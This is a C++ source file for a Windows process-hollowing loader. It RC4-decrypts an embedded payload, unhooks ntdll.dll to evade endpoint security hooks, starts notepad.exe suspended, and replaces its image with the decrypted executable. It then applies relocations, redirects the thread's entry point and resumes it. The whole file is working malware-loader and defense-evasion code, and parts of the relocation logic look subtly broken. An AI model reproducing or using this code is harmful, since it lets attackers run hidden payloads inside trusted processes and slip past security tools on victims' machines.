#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <fstream>
#include <psapi.h>

#include "Structs.hpp"
#include "Header.hpp"
#include "Payload.hpp"
#include "rc4.hpp"

// https://github.com/anthonywei/rc4
void rc4_setup(struct rc4_state* s, unsigned char* key, int length)
{
	int i, j, k, * m, a;

	s->x = 0;
	s->y = 0;
	m = s->m;

	for (i = 0; i < 256; i++)
	{
		m[i] = i;
	}

	j = k = 0;

	for (i = 0; i < 256; i++)
	{
		a = m[i];
		j = (unsigned char)(j + a + key[k]);
		m[i] = m[j]; m[j] = a;
		if (++k >= length) k = 0;
	}
}

void rc4_crypt(struct rc4_state* s, unsigned char* data, int length)
{
	int i, x, y, * m, a, b;

	x = s->x;
	y = s->y;
	m = s->m;

	for (i = 0; i < length; i++)
	{
		x = (unsigned char)(x + 1); a = m[x];
		y = (unsigned char)(y + a);
		m[x] = b = m[y];
		m[y] = a;
		data[i] ^= m[(unsigned char)(a + b)];
	}

	s->x = x;
	s->y = y;
}

// https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
VOID UnhookDll()
{
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);
}

int wmain()
{
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	std::string key = "123456789";

	UnhookDll();

	struct rc4_state* s;
	s = (struct rc4_state*)malloc(sizeof(struct rc4_state));

	rc4_setup(s, (unsigned char*)key.c_str(), key.size());
	rc4_crypt(s, buf, sizeof(buf));

	bool created = CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
	if (!created)
	{
		printf("[-] Failed to create process!\n");
		return -1;
	}

	printf("[+] Process ID : %d\n", pi->dwProcessId);
	printf("[+] Unmapping the process\n");

	PROCESS_BASIC_INFORMATION* pbi = GetProcessBasicInformation(pi->hProcess);
	printf("[+] PEB : %p\n", pbi->PebBaseAddress);

	LPVOID dImageBase = 0;
	SIZE_T fileBytesRead = 0;
	SIZE_T bytesRead = NULL;
	ULONG_PTR ImageBaseOffset = (ULONG_PTR)pbi->PebBaseAddress + 16;

	ReadProcessMemory(pi->hProcess, (LPCVOID)ImageBaseOffset, &dImageBase, 8, &bytesRead);
	printf("[+] Image base : %p\n", dImageBase);

	NTSTATUS status = UnmapView(pi->hProcess, dImageBase);
	if (status != 0)
	{
		printf("[-] Failed to unmap view\n");
		return -1;
	}

	printf("[+] View unmapped\n");

	PIMAGE_DOS_HEADER sourceDosHeader = (PIMAGE_DOS_HEADER)buf;
	PIMAGE_NT_HEADERS64 sourceNtHeaders = (PIMAGE_NT_HEADERS64)((ULONG_PTR)buf + sourceDosHeader->e_lfanew);
	SIZE_T sourceImageSize = sourceNtHeaders->OptionalHeader.SizeOfImage;

	status = AllocateMemory(pi->hProcess, dImageBase, sourceImageSize);
	if (status != 0)
	{
		printf("[-] Failed to allocate memory\n");
		return -1;
	}
	printf("[+] Allocated memory!\n");

	ULONG_PTR delta = (ULONG_PTR)dImageBase - sourceNtHeaders->OptionalHeader.ImageBase;
	sourceNtHeaders->OptionalHeader.ImageBase = (ULONG_PTR)dImageBase;

	status = WriteProcMemory(pi->hProcess, dImageBase, buf, sourceNtHeaders->OptionalHeader.SizeOfHeaders);
	if (status != 0)
	{
		printf("[-] Couldn't write to the process memory!\n");
		return -1;
	}

	PIMAGE_SECTION_HEADER sourceImgSection = (PIMAGE_SECTION_HEADER)((ULONG_PTR)buf + sourceDosHeader->e_lfanew + sizeof(_IMAGE_NT_HEADERS64));
	PIMAGE_SECTION_HEADER prevSourceImgSection = sourceImgSection;
	int error = GetLastError();

	for (int i = 0; i < sourceNtHeaders->FileHeader.NumberOfSections; i++)
	{
		PVOID destSectionLocation = (PVOID)((ULONG_PTR)dImageBase + sourceImgSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((ULONG_PTR)buf + sourceImgSection->PointerToRawData);

		WriteProcMemory(pi->hProcess, destSectionLocation, sourceSectionLocation, sourceImgSection->SizeOfRawData);
		sourceImgSection++;
	}


	IMAGE_DATA_DIRECTORY relocTable = sourceNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	sourceImgSection = prevSourceImgSection;
	for (int i = 0; i < sourceNtHeaders->FileHeader.NumberOfSections; i++)
	{
		BYTE* relocSectionName = (BYTE*)".reloc";
		if (RtlCopyMemory(sourceImgSection->Name, relocSectionName, 5) != 0)
		{
			sourceImgSection++;
			continue;
		}

		ULONG_PTR sourceRelocationTableRaw = sourceImgSection->PointerToRawData;
		ULONG_PTR relocOffset = 0;

		while (relocOffset < relocTable.Size)
		{
			PBASE_RELOCATION_BLOCK relocBlock = (PBASE_RELOCATION_BLOCK)((ULONG_PTR)buf + sourceRelocationTableRaw + relocOffset);
			relocOffset += sizeof(BASE_RELOCATION_BLOCK);

			ULONG_PTR relocEntryCount = (relocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK) - sizeof(BASE_RELOCATION_ENTRY));
			PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((ULONG_PTR)buf + sourceRelocationTableRaw + relocOffset);

			for (ULONG_PTR y = 0; y < relocEntryCount; y++)
			{
				relocOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocEntries[0].Type == 0)
					continue;

				ULONG_PTR patchAddress = relocBlock->PageAddress + relocEntries[y].Offset;
				ULONG_PTR patchedBuffer = 0;

				ReadProcMemory(pi->hProcess, (PVOID)((ULONG_PTR)dImageBase + patchAddress), &patchedBuffer, sizeof(ULONG_PTR));
				patchedBuffer += delta;

				WriteProcMemory(pi->hProcess, (PVOID)((ULONG_PTR)dImageBase + patchAddress), &patchedBuffer, sizeof(ULONG_PTR));
				error = GetLastError();
			}
		}
	}
	if (error != 0)
	{
		printf("[?] Error : %d\n", error);
		return -1;
	}

	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi->hThread, context);

	ULONG_PTR patchedEntryPoint = (ULONG_PTR)dImageBase + sourceNtHeaders->OptionalHeader.AddressOfEntryPoint;
	context->Rcx = patchedEntryPoint;
	printf("[+] Thread patched entrypoint : %p\n", patchedEntryPoint);

	SetThreadContext(pi->hThread, context);
	ResumeThread(pi->hThread);

	printf("[!] Done\n");
	getchar(); getchar();
}